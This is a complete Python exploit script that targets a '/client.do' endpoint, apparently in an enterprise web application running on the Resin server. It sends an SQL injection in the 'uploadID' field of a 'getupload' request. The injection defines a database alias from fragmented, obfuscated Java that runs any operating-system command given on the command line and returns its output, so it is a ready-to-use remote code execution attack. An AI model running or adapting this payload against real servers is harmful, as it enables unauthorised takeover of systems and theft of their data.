
# coding:utf-8
import requests
import sys

if len(sys.argv) < 3:
    print('Usage: python client.do-sqli-rce.py http://host/client.do whoami')
    sys.exit(1)

url = sys.argv[1]
cmd = sys.argv[2]

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
}

fields = {
    'method': (None, 'getupload'),
    'uploadID': (None, """1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('""" + cmd + """');--""")
}

proxies = {
    # "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"
}

rsp = requests.post(url=url, headers=headers, files=fields, proxies=proxies)

print(rsp.text)
